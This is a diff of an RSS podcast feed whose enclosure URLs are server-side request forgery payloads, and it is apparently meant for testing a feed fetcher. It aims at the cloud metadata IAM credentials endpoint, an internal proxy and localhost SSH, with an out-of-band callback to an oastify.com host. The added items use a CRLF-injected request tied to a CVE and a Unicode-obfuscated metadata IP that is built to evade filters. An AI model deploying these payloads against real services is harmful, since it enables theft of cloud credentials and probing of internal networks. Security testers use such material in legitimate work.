@@ -1,33 +1,9 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
-  <channel>
-    <title>Internal Infrastructure Audit</title>
-    <link>http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com</link>
-    <language>en-us</language>
-    
-    <item>
-      <title>Internal Proxy Scan</title>
-      <enclosure url="http://192.168.1.23:3128" length="5000" type="audio/mpeg"/>
-      <guid>proxy-test-$(date +%s)</guid>
-    </item>
+<item>
+  <title>CVE-2023-46214 Test</title>
+  <enclosure url="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/%0D%0A%0D%0AGET%20http://169.254.169.254/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0A%0D%0A" length="1000" type="audio/mpeg"/>
+</item>
 
-    <item>
-      <title>Metadata via Proxy</title>
-      <enclosure url="http://192.168.1.23:3128/http://169.254.169.254/latest/meta-data/iam/security-credentials/" length="5000" type="audio/mpeg"/>
-      <guid>meta-proxy-$(date +%s)</guid>
-    </item>
-
-    <item>
-      <title>Localhost SSH Scan</title>
-      <enclosure url="http://127.0.0.1:22" length="5000" type="audio/mpeg"/>
-      <guid>ssh-test-$(date +%s)</guid>
-    </item>
-
-    <item>
-      <title>OOB Verification</title>
-      <enclosure url="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/exfil-check" length="5000" type="audio/mpeg"/>
-      <guid>oob-test-$(date +%s)</guid>
-    </item>
-
-  </channel>
-</rss>
+<item>
+  <title>Unicode Bypass</title>
+  <enclosure url="http://16⑨.25④.16⑨.25④/latest/meta-data/iam/security-credentials/" length="1000" type="audio/mpeg"/>
+</item>
